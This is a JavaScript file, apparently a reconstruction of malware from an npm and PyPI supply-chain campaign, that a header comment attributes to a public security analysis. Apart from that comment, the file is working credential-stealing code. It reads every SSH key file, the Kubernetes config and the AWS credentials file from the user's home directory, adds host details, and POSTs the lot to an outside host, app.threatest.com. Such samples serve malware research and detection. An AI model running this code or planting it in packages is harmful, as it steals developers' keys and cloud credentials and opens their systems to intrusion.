// kubeconfig-theft — reconstructed from public security analyses
// Source: https://blog.phylum.io/sensitive-data-exfiltration-campaign-targets-npm-and-pypi/
//
// Mass exfiltration campaign targeting SSH keys and Kubernetes config.
// 46+ publications across npm and PyPI. Steals ~/.ssh/ and ~/.kube/config.
//
// Technique: SSH key theft + Kubernetes config theft + HTTPS exfiltration

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");

var home = os.homedir();
var data = {
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd()
};

// Steal SSH keys
var sshDir = path.join(home, ".ssh");
try {
  if (fs.existsSync(sshDir)) {
    var sshFiles = fs.readdirSync(sshDir);
    data.ssh = {};
    sshFiles.forEach(function(f) {
      var fp = path.join(sshDir, f);
      try {
        var stat = fs.statSync(fp);
        if (stat.isFile() && stat.size < 100000) {
          data.ssh[f] = fs.readFileSync(fp, "utf8");
        }
      } catch(e) {}
    });
  }
} catch(e) {}

// Steal Kubernetes config
var kubeConfig = path.join(home, ".kube", "config");
try {
  if (fs.existsSync(kubeConfig)) {
    data.kubeconfig = fs.readFileSync(kubeConfig, "utf8");
  }
} catch(e) {}

// Steal AWS credentials
var awsCreds = path.join(home, ".aws", "credentials");
try {
  if (fs.existsSync(awsCreds)) {
    data.aws = fs.readFileSync(awsCreds, "utf8");
  }
} catch(e) {}

// Exfiltrate
var payload = JSON.stringify(data);
var req = https.request({
  hostname: "app.threatest.com",
  path: "/data",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(payload)
  }
});
req.write(payload);
req.end();
